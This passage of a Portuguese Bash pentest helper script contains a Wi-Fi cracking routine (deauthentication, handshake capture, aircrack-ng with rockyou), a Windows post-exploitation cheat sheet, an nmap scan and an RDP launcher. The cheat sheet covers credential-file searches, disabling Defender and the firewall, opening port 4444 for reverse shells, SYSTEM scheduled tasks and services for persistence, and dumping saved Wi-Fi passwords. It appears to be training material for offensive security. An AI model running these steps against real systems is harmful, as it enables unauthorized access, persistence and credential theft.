                sleep 5
            fi
        done
    }

    # Função para quebrar a senha usando um dicionário de palavras
    function quebra_senha_dicionario(){
        aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
    }

    # Função principal para executar todas as etapas do ataque
    function main_wifi_atk(){
        # Executa as configurações pré-ataque
        pre_configuracoes;
        # Verifica as interfaces disponíveis
        interfaces_disponiveis;
        # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
        configuracoes_iniciais;
        # Inicia o monitoramento em modo promíscuo
        monitoramento_promiscuo;
        # Escaneia o AP alvo e grava os resultados em um arquivo de log
        scan_ap_alvo;
        # Captura o handshake de autenticação entre o cliente e o AP alvo
        captura_4whsk;
        # Realiza um ataque de desautenticação no cliente especificado
        ataque_deauth;
        # Tenta quebrar a senha utilizando um dicionário
        quebra_senha_dicionario;
        # Mensagem para pressionar ENTER para continuar
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
        read -r 2> /dev/null
        # Chamada da função principal do menu principal após pressionar ENTER
        main_menu;  
    }

    # Chama a função principal
    main_wifi_atk;

}
#
function xix_cmd_basicos_windows(){
    clear
    echo -e ""
    function comandos_basicos() {
        echo -e "${WHITE}############################## COMANDOS BÁSICOS ##############################${RESET}"
        echo -e "${RED}help ${GRAY}# Mostra os comandos disponíveis.${RESET}"
        echo -e "${RED}help <comando> OR <comando> /? ${GRAY}# Mostra a ajuda para utilizar determinado comando.${RESET}"
        echo -e ""
        echo -e "${RED}cls ${GRAY}# Serve para limpar a tela do terminal em uso${RESET}"
    }
    function dir_cmd(){
        echo -e "${WHITE}################### DIR #######################${RESET}"
        echo -e "${RED}dir ${GRAY}# Serve para listar os arquivos presentes no diretório atual.${RESET}"
        echo -e "${RED}dir /a ${GRAY}# Lista inclusive arquivos ocultos${RESET}"
        echo -e ""
    }
    function gamb_dir2find(){
        echo -e "${WHITE}############### GAMBIARRA SEMELHANTE AO FIND #################${RESET}"
        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config* ${GRAY}# Busca por arquivos que contenham o nome especificado, a partir do diretório atual. (observação: '==' é equivalente a 'or')${RESET}"
        echo -e ""
    }
    function cd_cmd(){
        echo -e "${WHITE}################### CD #######################${RESET}"
        echo -e "${RED}cd <diretorio> ${GRAY}# Serve para navegar entre os diretórios do Windows.${RESET}"
        echo -e "${RED}cd .. ${GRAY}# Navegar para um diretório acima do diretório atual${RESET}"
        echo -e "${RED}cd ${GRAY}# Mostra qual o diretório atual (semelhante ao \"pwd\" do linux)${RESET}"
        echo -e ""
        echo -e "${RED}md ${GRAY}# Serve para criar um novo diretório.${RESET}"
        echo -e ""
    }
    function rd_cmd(){
        echo -e "${WHITE}################### RD #######################${RESET}"
        echo -e "${RED}rd ${GRAY}# Serve para deletar um diretório.${RESET}"
        echo -e "${RED}rd /s ${GRAY}# modo recursivo${RESET}"
        echo -e "${RED}rd /q ${GRAY}# (quiet, sem pedir confirmação)${RESET}"
        echo -e ""
        echo -e "${RED}type ${GRAY}# Exibe o conteúdo, em formato de texto, de um arquivo.${RESET}"
        echo -e ""
        echo -e "${RED}ren <nome_antigo> <nome_novo> ${GRAY}# Renomear determinado arquivo ou diretório.${RESET}"
        echo -e ""
    }
    function xcopy_cmd(){
        echo -e "${WHITE}################### XCOPY #######################${RESET}"
        echo -e "${RED}xcopy <arquivo_original> <nome_da_copia> ${GRAY}# Faz a cópia de arquivos/diretórios. Porém não copia os subdiretórios.${RESET}"
        echo -e ""
        echo -e "${RED}xcopy /e <original> <copia> ${GRAY}# Copia inclusive subdiretórios.${RESET}"
        echo -e "${RED}xcopy /s <original> <copia> ${GRAY}# Copia inclusive subdiretórios, exceto os subdiretórios vazios.${RESET}"
        echo -e ""
        echo -e ""
        echo -e "${RED}del ${GRAY}# Deleta um arquivo e/ou diretório${RESET}"
        echo -e ""
        echo -e ""
        echo -e "${RED}move <origem> <destino> ${GRAY}# Move um arquivo/diretório de um local para outro.${RESET}"
        echo -e ""
    }
    function whoami_cmd(){
        echo -e "${WHITE}################### WHOAMI #######################${RESET}"
        echo -e "${RED}whoami ${GRAY}# Mostra o nome de usuário e domínio atual.${RESET}"
        echo -e "${RED}whoami /priv ${GRAY}# Mostra os privilégio do usuário.${RESET}"
        echo -e ""
    }
    function tree_cmd(){
        echo -e "${WHITE}################### TREE #######################${RESET}"
        echo -e "${RED}tree ${GRAY}# Lista o diretório atual e todos os seus subdiretórios.${RESET}"
        echo -e "${RED}tree <diretorio> ${GRAY}# Lista o diretório informado e todos os seus subdiretórios${RESET}"
        echo -e "${RED}tree /f ${GRAY}# Lista o diretório atual, assim como todos os seus subdiretórios e arquivos.${RESET}"
        echo -e ""
    }
    function shutdown_cmd(){
        echo -e "${WHITE}################### SHUTDOWN #######################${RESET}"
        echo -e "${RED}shutdown ${GRAY}# Desligar/ reiniciar o sistema.${RESET}"
        echo -e "${RED}shutdown /s ${GRAY}# Desligar${RESET}"
        echo -e "${RED}shutdown /l ${GRAY}# fazer logoff${RESET}"
        echo -e "${RED}shutdown /r ${GRAY}# reiniciar${RESET}"
        echo -e "${RED}shutdown /f ${GRAY}# executar shutdown sem avisar o usuário (Força fechamento dos programas em execução)${RESET}"
        echo -e "${RED}shutdown /c \"comentario\" ${GRAY}# aparece um aviso para o usuário antes de fazer o desligamento.${RESET}"
        echo -e ""
    }
    function outros(){
        echo -e "${WHITE}################### OUTROS #######################${RESET}"
        echo -e "${RED}> ${GRAY}# Direciona a saída de um comando para um arquivo (substituindo o conteúdo do arquivo).${RESET}"
        echo -e "${RED}>> ${GRAY}# Direciona a saída de um comando para o conteúdo de um arquivo (Adiciona o conteúdo do arquivo).${RESET}"
        echo -e ""
        echo -e "${RED}sort arquivo.txt ${GRAY}# Exibe o conteúdo do arquivo especificado, na ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
        echo -e "${RED}sort /r arquivo.tx ${GRAY}# Exibe o conteúdo do arquivo especificado, de maneira inversa à ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
        echo -e ""
        echo -e "${RED}type arquivo.txt | sort ${GRAY}# O comando sort é executado em cima do resultado do comando type.${RESET}"
        echo -e ""
        echo -e "${RED}2>nul ${GRAY}# Omite a saída de erros de um comando.${RESET}"
        echo -e ""
    }
    function findstr_cmd(){
        echo -e "${WHITE}################### FINDSTR #######################${RESET}"
        echo -e "${RED}findstr \"string\" <arquivo.txt> ${GRAY}# Exibe apenas as linhas do arquivo.txt que possuam a string especificada.${RESET}"
        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>nul ${GRAY}# Procura, em todos os arquivos a partir do diretório atual, por arquivos que contenham a string especificada.${RESET}"
        echo -e ""
    }
    function attrib_cmd(){
        echo -e "${WHITE}################### ATTRIB #######################${RESET}"
        echo -e "${RED}attrib ${GRAY}# Exibe os atributos dos arquivos do diretório atual.${RESET}"
        echo -e "${RED}attrib /d ${GRAY}# Exibe os atributos dos arquivos e diretórios do diretório atual. ${RESET}"
        echo -e "${RED}attrib /s ${GRAY}# Exibe os atributos dos arquivos do diretório atual e dos arquivos nos subdiretórios.${RESET}"
        echo -e ""
        echo -e "${RED}attrib +S +H <arquivo> ${GRAY}# Deixa um arquivo oculto e não mostra esse arquivo, quando aberto pela interface gráfica, mesmo com a opção de "mostrar arquivos ocultos" estando ativa.${RESET}"
        echo -e ""
    }
    function cmd4enum_cmd(){
        echo -e "${WHITE}################### CMD 4 ENUM #######################${RESET}"
        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config*${RESET}"
        echo -e "${RED}tree /f${RESET}"
        echo -e "${RED}findstr /spin /c:\"password\" *.* 2>null${RESET}"
        echo -e ""
    }
    function icalcs(){
        echo -e "${WHITE}################### ICALCS #######################${RESET}"
        echo -e "${RED}ICACLS: —> Lista e gerencia as DACL (informações de permissão) das pastas/arquivos.${RESET}"
        echo -e ""
        echo -e "${GRAY}Exemplo:${RESET}"
        echo -e "${BLUE}> icacls \"arquivo 2.txt\"${RESET}"
        echo -e "${GRAY}#arquivo 2.txt AUTORIDADE NT\SISTEMA:(I)(F) -- SYSTEM${RESET}"
	    echo -e "${GRAY}#              BUILTIN\Administradores:(I)(F) -- USUARIOS ADMIN${RESET}"
	    echo -e "${GRAY}#              DESKTOP-JPMQF3L\aluno:(I)(F) -- USUARIO aluno MAQUINA JPMQF3L${RESET}"
        echo -e ""
        echo -e "${RED}icacls arquivo /grant aluno:F ${GRAY}# Adicionar permissões${RESET}"
        echo -e ""
        echo -e "${RED}icacls arquivo /deny aluno:F ${GRAY}# Negar permissões${RESET}"
        echo -e ""
        echo -e "${RED}whoami /groups ${GRAY}# Verificar o nível de integridade${RESET}"
    }
    function system_info(){
        echo -e ""
        echo -e "${WHITE}################### INFORMAÇOES DO SISTEMA #######################${RESET}"
        echo -e "${RED}hostname ${GRAY}# Exibe o nome do host${RESET}"
        echo -e ""
        echo -e "${RED}netstat -ano ${GRAY}# Mostra serviços com portas e conexões ativas.${RESET}"
        echo -e ""
        echo -e "${RED}ver ${GRAY}# Exibe a build do sistema${RESET}"
        echo -e ""
        echo -e "${RED}systeminfo ${GRAY}# Exibe informações do sistema${RESET}"
        echo -e ""
        echo -e "${RED}winver ${GRAY}# Exibe a versão, build e SO.${RESET}"
        echo -e ""
    }
    function processos_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE PROCESSOS #######################${RESET}"
        echo -e "${GRAY}Processo corresponde a uma instância de um programa, ou seja, um programa que está sendo executado no sistema operacional, consumindo recursos.${RESET}"
        echo -e ""
        echo -e "${RED}wmic product get name,version,installlocation ${GRAY}# Lista os programas instalados no sistema, assim como suas versões e locais onde estão instalado.${RESET}"
        echo -e ""
        echo -e "${RED}tasklist ${GRAY}# Lista os processos ativos, nomes, PID, etc...${RESET}"
        echo -e "${RED}tasklist /M ${GRAY}# lista as DLL que cada processo usa${RESET}"
        echo -e "${RED}tasklist /SVC ${GRAY}# lista os serviços relacionados com esse processo${RESET}"
        echo -e "${RED}tasklist /V ${GRAY}# Mostra qual usuário está utilizando determinado processo${RESET}"
        echo -e ""
        echo -e "${RED}taskkill /pid xxxx /f ${GRAY}# Mata determinado processo ativo (Ex: taskkill /pid 3395).${RESET}"
        echo -e ""
    }
    function usuarios_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE USUARIOS #######################${RESET}"
        echo -e "${RED}net user ${GRAY}# Listar usuários da maquina${RESET}"
        echo -e "${RED}net user <usuario> ${GRAY}# Ver detalhes do usuário (grupos, etc)${RESET}"
        echo -e "${RED}net localgroup ${GRAY}# Lista grupos existentes na máquina${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> ${GRAY}# Ver quais usuários estão em determinado grupo${RESET}"
        echo -e "${RED}net user <novo_usuario> <nova_senha> /add ${GRAY}# Criar novo usuário${RESET}"
        echo -e "${RED}net user <usuario> /del ${GRAY}# Remover o usuário especificado ${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /add ${GRAY}# Adicionar o usuário especificado no grupo especificado${RESET}"
        echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /del ${GRAY}# Remover o usuário especificado no grupo especificado ${RESET}"
        echo -e "${RED}net user <usuario> <nova_senha> ${GRAY}# Alterar senha de um usuário${RESET}"
        echo -e "${RED}net user <usuario> /active:yes ${GRAY}# Habilitar ou desabilitar usuário (yes ou no)${RESET}"
        echo -e ""
    }
    function firewall_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE FIREWALL #######################${RESET}"
        echo -e "${RED}netsh advfirewall show currentprofile ${GRAY}# Mostra o status do firewall (apenas o perfil ativo)"
        echo -e "${RED}netsh advfirewall set allprofiles state off ${GRAY}# Desabilita o firewall do Windows."
        echo -e "${RED}netsh advfirewall set allprofiles state on ${GRAY}# Habilita o firewall do Windows."
        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp program=\"C:\caminho\programa.exe\" enable=yes ${GRAY}# Permitir que um programa especifico no echo -e firewall."
        echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp localport=4444 enable=yes ${GRAY}# Abrir a porta especificada no firewallecho -e "
        echo -e ""
        echo -e "${GRAY}# dir = in | out"
        echo -e "${GRAY}# action = allow|block"
        echo -e "${GRAY}# protocol = TCP | UDP |any"
        echo -e "${GRAY}# Obs: As portas 80 e 443 costumam estar abertas para conexões de saída. Interessante tentar utilizar essas portas para obter um shell reverso."
        echo -e ""
    }
    function antivirus_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE ANTIVIRUS #######################${RESET}"
        echo -e "${GRAY}Sequencia de comandos para tentar desabilitar o Windows defender, utilizando o powershell. Não é necessário reiniciar a máquina. Mudar para ${GREEN} \$false ${RESET}${GRAY} caso queira reativar:${RESET}"
        echo -e ""
        echo -e "${RED}powershell.exe Set-MpPreference -DisableRealTimeMonitoring \$true ${GRAY}# Desabilita o scan em tempo real${RESET}"
        echo -e ""
        echo -e "${GRAY}No Windows a partir da ${GREEN}build 18305, a proteção contra violações do Windows defender deve estar desativada.${RESET}${GRAY} Para verificar se a proteção contra violações está ativa, use o comando:"
        echo -e ""
        echo -e "${RED}powershell.exe Get-MpComputerStatus${RESET}"
        echo -e ""
        echo -e "${GRAY}Na saída do comando acima, ${RED}procurar por \"IsTamperProtected\". Caso esteja como true, não será possível desabilitar o Windows defender via terminal.${RESET}"
        echo -e ""
    }
    function tarefas_agendadas_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE TAREFAS AGENDADAS #######################${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /query /v /fo list ${GRAY}# Lista as tarefas agendadas disponíveis no sistema. Filtrar saída com findstr para buscar algo especifico.${RESET}"
        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".exe\" ${GRAY}# Exemplo${RESET}"
        echo -e "${RED}schtasks /query /v /fo list | findstr /L \".bat\" ${GRAY}# Exemplo${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"dominio\usuário\" /RP \"senha_do_usuário\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário especificado, a cada minuto.${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"system\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário system, a cada minuto (Precisa ser executado por um terminal com privilégio [obter persistência após explorar um alvo]).${RESET}"
        echo -e ""
        echo -e "${RED}schtasks /run /I /TN \"nome_da_tarefa_agendada\" ${GRAY}# Executar imediatamente determinada tarefa agendada. ${RESET}"
        echo -e "${RED}schtasks /delete /tn \"nome_da_tarefa\" ${GRAY}# Deletar uma tarefa agendada.${RESET}"
        echo -e "${RED}schtasks /delete /tn \"windowsupdate\"${RESET}"
        echo -e ""
    }
    function servicos_gerenciamento(){
        echo -e "${WHITE}################### GERENCIAMENTO DE SERVIÇOS #######################${RESET}"
        echo -e ""
        echo -e "${RED}sc query ${GRAY}# lista os serviços ativos.${RESET}"
        echo -e "${RED}sc query state= all ${GRAY}# Lista todos os serviços${RESET}"
        echo -e ""
        echo -e "${RED}wmic service get name,pathname,startmode,startname ${GRAY}# Mostra os serviços, com alguns filtros${RESET} "
        echo -e ""
        echo -e "${RED}sc query state= all | findstr \"NOME_DO_SERVIÇO\" ${GRAY}# Lista apenas os nomes dos serviços (Para Windows em português)${RESET}"
        echo -e ""
        echo -e "${RED}sc create \"nome_do_serviço\" binPath= \"caminho_do_executável\" DisplayName= \"descrição_do_serviço\" start= \"auto\" obj= \".\ LocalSystem\" ${GRAY}# Criar um novo serviço, que será executado pelo usuário system.${RESET}"
        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
        echo -e "${YELLOW}${BG_BLACK}##### - Atenção para o espaço após os sinais de " = " !!! ######${RESET}"
        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
        echo -e ""
        echo -e "${RED}sc qc <nome_do_servico> ${GRAY}# Mostra configurações e informações de um serviço.${RESET}"
        echo -e "${RED}sc start <nome_do_servico> ${GRAY}# Inicia um serviço${RESET}"
        echo -e "${RED}sc stop <nome_do_servico> ${GRAY}# Para um serviço${RESET}"
        echo -e "${RED}sc delete \"nome_do_serviço\" ${GRAY}# Exclui um serviço${RESET}"
        echo -e "${RED}sc config <nome_do_servico> binPath= <novo_caminho_do_executavel> ${GRAY}# Exemplo de comando para mudar o caminho do executável que o serviço executa.${RESET}"
        echo -e ""
    }
    function extracao_senhas(){
        echo -e "${WHITE}################### EXTRAÇÃO DE SENHAS #######################${RESET}"
        echo -e ""
        echo -e "${RED}netsh wlan show profiles ${GRAY}# Mostra as redes wi-fi que estão salvas na maquina.${RESET}"
        echo -e "${RED}netsh wlan show profiles name=\"nome_da_rede\" key=clear ${GRAY}# Exibe algumas informações da rede wi-fi salva, inclusive a senha em claro.${RESET}"
        echo -e ""

    }
    function registros_windows(){
        echo -e "${WHITE}################### REGISTRO DO WINDOWS #######################${RESET}"
        echo -e "${RED}HKEY_CLASSES_ROOT (HKCR)${GRAY}: Presente nas versões atuais do Windows apenas para manter a compatibilidade com programas mais antigos.${RESET}"
        echo -e "${RED}HKEY_CURRENT_USER (HKCU)${GRAY}: Contém todas as configurações do usuário logado no sistema.${RESET}"
        echo -e "${RED}HKEY_LOCAL_MACHINE (HKLM)${GRAY}: Chave mais importante do registro, guarda todas as informações que o sistema operacional precisa para funcionar e de sua interface gráfica. Utiliza o arquivo SYSTEM para armazenar essas configurações.${RESET}"
        echo -e "${RED}HKEY_USERS (HKU)${GRAY}: Guarda as configurações de aparência do Windows e as configurações efetuadas pelos usuários, como papel de parede, protetor de tela, temas e outros.${RESET}"
        echo -e "${RED}HKEY_CURRENT_CONFIG (HKCC)${GRAY}: Salva os perfis de hardware utilizados pelo usuário.${RESET}"
        echo -e "${RED}HKEY_LOCAL_MACHINE\Software\RegisteredApplications${GRAY} = subchave \"RegisteredApplications\" da subchave \"Software\" da chave HKEY_LOCAL_MACHINE.${RESET}"
        echo -e ""
        echo -e "${YELLOW}Através do registro do Windows, é possível mudar o comportamento padrão de alguns programas do Sistema Operacional, assim como é possível conseguir algumas informações importantes, como versão de programas, senhas, etc${RESET}"
        echo -e "${GRAY}Exemplos:"
        echo -e "   ${RED}\"HKLM\SOFTWARE\RealVNC\WinVNC4\" /v password ${GRAY}# O programa RealVNC salva a senha criptografada no seguinte valor do registro${RESET}"
        echo -e "   ${RED}\"HKCU\Software\SimonTatham\PuTTY\" ${GRAY}# O programa PuTTY salva detalhes sobre conexões realizadas utilizando o programa, na seguinte subchave${RESET}"
        echo -e "   ${RED}\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections ${GRAY}# O windows utiliza o seguinte valor para habilitar/desabilitar o acesso remoto ao sistema${RESET}"
        echo -e ""
        echo -e "${YELLOW}REGISTRO DO WINDOWS - Interagindo via terminal${RESET}"
        echo -e "   ${RED}reg query chave\subchave\subchave\subchave ${GRAY}# Comando para ver os valores e subchaves contido no caminho especificado.${RESET} "
        echo -e "   ${RED}reg query \"HKLM\SOFTWARE\WinRAR\Capabilities\FileAssociations\" ${GRAY}# Exemplo${RESET}"
        echo -e "   ${RED}reg add <chave\subchave\subchave> ${GRAY}# Adicionar uma subchave no no registro"
        echo -e "   ${RED}reg add <chave\subchave\subchave> /v <nome_do_valor> /t <tipo> /d <dado> ${GRAY}# Adicionar um valor no registro.${RESET}"
        echo -e "   ${RED}reg delete <chave\subchave\subchave> ${GRAY}# Remover uma chave do registro${RESET}"
        echo -e "   ${RED}reg save <chave\subchave\subchave arquivo_de_saida> ${GRAY}# Copiar chaves/subchaves para um arquivo.${RESET}"
        echo -e ""
        echo -e ">>> !!! IMPORTANTE !!! <<<   ${RED}reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f ${GRAY}# Ao editar essa chave, o protocolo RDP fica ativado na maquina${RESET}"
    } 
    function main_cmd_basicos_windows(){
        comandos_basicos;
        dir_cmd;
        cd_cmd;
        rd_cmd;
        xcopy_cmd;
        whoami_cmd;
        tree_cmd;
        shutdown_cmd;
        findstr_cmd;
        gamb_dir2find;
        attrib_cmd;
        cmd4enum_cmd;
        icalcs;
        system_info;
        processos_gerenciamento;
        usuarios_gerenciamento;
        firewall_gerenciamento;
        antivirus_gerenciamento;
        tarefas_agendadas_gerenciamento
        servicos_gerenciamento;
        registros_windows;
        outros;
    }
    main_cmd_basicos_windows | tee comandos_windows.txt;
    echo "Arquivo comandos_windows.txt gerado para consultas"
    pausa_script;

    # Chamada da função principal do menu principal após pressionar ENTER
    main_menu;


}
#
function xxii_nmap_descoberta_de_rede(){
    local rede
    rede="$(ipcalc -n -b -n -b "$(ip -br a | grep tap | head -n 1 | awk '{print $3}')" | awk '/Network/ {print $2}')"
    cd /usr/share/nmap/scripts && nmap -sC -sV -vv -O $rede | tee /home/kali/nmap.txt
    echo ""
    pausa_script;
}
#
function xxiii_nmap(){
    echo "nmap"
}
#
function xxiv_revshell_windows(){
    echo "revshell_windows"
}
#
function xxv_rdp_windows(){
    echo -n "Insira o IP do host windows: "
    read -r  IP_HOST
    echo -n "Insira o usuario: "
    read -r USER
    echo -n "Insira o password: "
    read -r PASSWD
    tilix --action=app-new-session --command="$(xfreerdp /u:"$USER" /p:"$PASSWD" /w:1366 /h:768 /v:"$IP_HOST" /smart-sizing +auto-reconnect)"
}
#
#============================================================

######## CHEGAGEM DE PARAMETROS & EXECUÇÃO DO MAIN_MENU ########
# Verifica se o número de argumentos passados para o script é diferente de zero.
# Check if the script is being run with root privileges 
# If not, display an error message and exit with a non-zero status code 
#Encerra todos os processos do openvpn
if [ "$(id -u)" != "0" ]; then
    msg_erro_root;
    # Check if the correct number of arguments is provided 
    # If not, display a usage message and exit with a non-zero status code 
    elif [ "$#" -ne 0 ]; then
        msg_erro_arquivo;
    else
        ######### Executa a função principal ########
        enable_proxychains; # Call the function to enable proxychains at script start
        main_menu;
fi
#============================================================

#Extracting URLs from a Web Page - Web and Internet Users (177) - Chapter 7 - Wicked Cool Scripts
